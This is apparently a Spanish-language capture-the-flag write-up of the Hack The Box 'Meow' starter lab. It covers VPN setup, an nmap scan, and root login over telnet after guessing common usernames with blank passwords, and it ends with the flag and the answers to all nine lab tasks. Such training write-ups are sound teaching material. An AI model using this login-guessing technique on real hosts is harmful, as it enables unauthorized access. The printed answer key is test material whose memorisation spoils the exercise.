---
layout: single
title: Meow - Hack The Box
excerpt: "Meow es la primera maquina vulnerable, pertenece al punto de partida Tier 0 en las Pruebas de Penetración Nivel 1, para completar esta máquina se debe completar una serie de preguntas, no sin antes conectarnos a la red del objetivo donde podemos elegir entre una conexión Pwnbox o un Red Privada Virtual (VPN), Meow Write Up se realizará mediante el archivo de configuración VPN (.ovpn)"
date: 2022-09-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-meow/meow-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hack the box
  - starting point
tags:
  - enumeration
  - telnet
  - external
  - penetration tester level 1
---

![](/assets/images/htb-writeup-meow/meow1.png)

Meow es la primera maquina vulnerable, pertenece al punto de partida Tier 0 en las Pruebas de Penetración Nivel 1, para completar esta máquina se debe completar una serie de preguntas, no sin antes conectarnos a la red del objetivo donde podemos elegir entre una conexión Pwnbox o un Red Privada Virtual (VPN), Meow Write Up se realizará mediante el archivo de configuración VPN (.ovpn) de Hack The Box.

## Resumen

- Escanear todos los puertos abiertos de la maquina objetivo y determinar los servicios que se ejecutan mediante el script de Network Mapper (nmap)
- Explotar la vulnerabilidad de Telnet, para obtener el acceso como Administrador

## Conectar a Hack the Box

Una vez ingresado a nuestra cuenta de Hack the Box, es necesario descargar el archivo de configuración .opvn en nuestra máquina desde la opción `CONNECT TO HTB` esto descargará un archivo con extensión .ovpn en nuestro directorio `Downloads` para ejecutar el archivo y crear un tunel, esto lo realizaremos mediante una nueva ventana de terminal.

![](/assets/images/htb-writeup-meow/connect-to-htb.png)

Desde la terminal es necesario dirigirnos hacia la carpeta Downloads. Para ello ejecutamos el comando `cd ~/Downloads`, una vez alli ejecutamos el comando `ls` para verificar si el archivo con extensión .opvn esta presente en el sistema. Por último debemos iniciar nuestra sesión como cliente OpenVPN y conectarnos a la red interna de Hack The Box con el siguiente comando desde la terminal `sudo openvpn {filename}.ovpn`, donde {filename} debe reemplazarse con el nombre de su archivo, al ejecutar el comando se nos pedira nuestra constraseña de superusuario.

```
┌─[fabro@parrot]─[~]
└──╼ $pwd
/home/fabro
┌─[fabro@parrot]─[~]
└──╼ $ls
Descargas  Desktop  Documentos  Imágenes  Música  Público  Templates  Vídeos
┌─[fabro@parrot]─[~]
└──╼ $cd Descargas/
┌─[fabro@parrot]─[~/Descargas]
└──╼ $ls
starting_point_fabrohacks.ovpn
┌─[fabro@parrot]─[~/Descargas]
└──╼ $sudo openvpn starting_point_fabrohacks.ovpn 
[sudo] password for fabro: 
```
Una vez ejecutado el script se mostrará el mensaje `Initialization Sequence Complete`, el script configura un tunel virtual `tun0` el cual podemos comprobar mediante el comando `ifconfig` y observar la dirección asignada, por cuestiones de seguridad algunas direcciones ip se han modificado.

```
2022-09-24 00:11:23 net_route_v4_add: 10.10.10.0/23 via 10.10.14.1 dev [NULL] table 0 metric -1
2022-09-24 00:11:23 net_route_v4_add: 10.129.0.0/16 via 10.10.14.1 dev [NULL] table 0 metric -1
2022-09-24 00:11:23 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2022-09-24 00:11:23 Initialization Sequence Completed

┌─[fabro@parrot]─[~]
└──╼ $ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.133  netmask 255.255.254.0  destination 10.10.14.133
        inet6 dddd:bbbb:1::1025  prefixlen 64  scopeid 0x0<global>
        inet6 bdbd::5657:adbd:2222:23d  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7  bytes 336 (336.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Por última instancia procedemos a conectar a la caja Meow desde la página Hack The Box, hacemos clic para generar la maquina `Spawn Machine` y observamos la dirección ip que se asigna

![](/assets/images/htb-writeup-meow/ip-meow.png)

## Enumeración

Una vez establecida la conexión VPN podemos hacer ping a la dirección IP de la máquina Meow y verificar si los paquetes llegan a su destino esto lo realizamos con el comando `ping 10.129.211.201` se establece un máximo de cuatro paquetes
```
┌─[fabro@parrot]─[~]
└──╼ $ping -c4 10.129.211.201
PING 10.129.211.201 (10.129.211.201) 56(84) bytes of data.
64 bytes from 10.129.211.201: icmp_seq=1 ttl=63 time=173 ms
64 bytes from 10.129.211.201: icmp_seq=2 ttl=63 time=177 ms
64 bytes from 10.129.211.201: icmp_seq=3 ttl=63 time=257 ms
64 bytes from 10.129.211.201: icmp_seq=4 ttl=63 time=168 ms

--- 10.129.211.201 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 168.236/193.766/257.319/36.811 ms
```

El siguiente punto es escanear todos los puertos abiertos del objetivo para determinar los servicios que se ejecutan en él, para iniciar el proceso de escaneo podemos usar el comando con el script nmap con el indicador -sV para determinar el nombre y la descripción de los servicios identificados, este comando enviará solicitudes a los puertos del objetivo e indicando si el puerto está abierto o no

```
┌─[fabro@parrot]─[~]
└──╼ $sudo nmap -sV 10.129.211.201
[sudo] password for fabro: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 00:56 -05
Nmap scan report for 10.129.211.201
Host is up (0.17s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds
```

## Foothold

Al terminar el escaneo, se identifica el puerto 23/tcp en estado abierto, ejecutando el servicio telnet, el cual permite la gestión remota de otros hosts en la red, las solicitudes de conexión a través de telnet se configura mediante configuraciones de nombre de usuario y contraseña.

Para acceder a la gestión de telnet ingresamos el siguiente comando apuntando la direccion ip de nuestro objetivo `telnet 10.129.211.201`
```
┌─[fabro@parrot]─[~]
└──╼ $telnet 10.129.211.201
Trying 10.129.211.201...
Connected to 10.129.211.201.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login:
```
En ocasiones, los administradores de red suelen dejar las constraseñas en blanco por motivos de accesibilidad, este es un problema importante con algunos dispositivos de red o hosts, dejándolos abiertos a simples ataques de fuerza bruta, donde el atacante puede intentar iniciar sesión secuencialmente, utilizando una lista de nombres de usuario sin contraseña.

Entre las cuentas más comunes tenemos:
- admin
- administrator
- root

Aprovechando este defecto podemos acceder a la administracion de la maquina vulnerable con el usuario root y con la contraseña en blanco, debido a que los otros usuarios de login son incorrectos

```
  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: admin
Password: 

Login incorrect
Meow login: administrator
Password: 

Login incorrect
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 24 Sep 2022 06:33:41 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.211.201
root@Meow:~#
```

Con éxito hemos iniciado sesión en el sistema de destino como root esto lo podemos verificar mediante el simbolo del  prompt #. Ahora podemos continuar y listar el contenid del directorio mediante el comando `ls`, como consecuencia nos encontramos con el archivo flag.txt que es nuestro objetivo en este caso.

```
root@Meow:~# ls
flag.txt  snap
```
Podemos visualizar el contenido del archivo flag.txt mediante el comando `cat flag.txt` la salida de este comando nos mostrará el CTF del objetivo
```
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```

## Respuestas

Task 1

What does the acronym VM stand for?
- Virtual Machine

Task 2

What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.
- terminal 

![](/assets/images/htb-writeup-meow/task1-2.png)

Task 3

What service do we use to form our VPN connection into HTB labs?
- openvpn

Task 4

What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output?
- tun

![](/assets/images/htb-writeup-meow/task3-4.png)

Task 5

What tool do we use to test our connection to the target with an ICMP echo request?
- ping

Task 6

What is the name of the most common tool for finding open ports on a target?
- nmap

![](/assets/images/htb-writeup-meow/task5-6.png)

Task 7

What service do we identify on port 23/tcp during our scans? 
- telnet

Task 8

What username is able to log into the target over telnet with a blank password?
- root

![](/assets/images/htb-writeup-meow/task7-8.png)

Task 9

Submit root flag
- b40abdfe23665f766f9c61ecba8a4c19

<p> Al culminar obtenemos un certificado de finalización, el cual puede ser compartido mediante Facebook, LinkeDin, Twitter, mi certificado se encuentra disponible <a href="https://www.hackthebox.com/achievement/machine/914953/394" target="_blank"> aquí</a>.</p>
![](/assets/images/htb-writeup-meow/certificado.png)
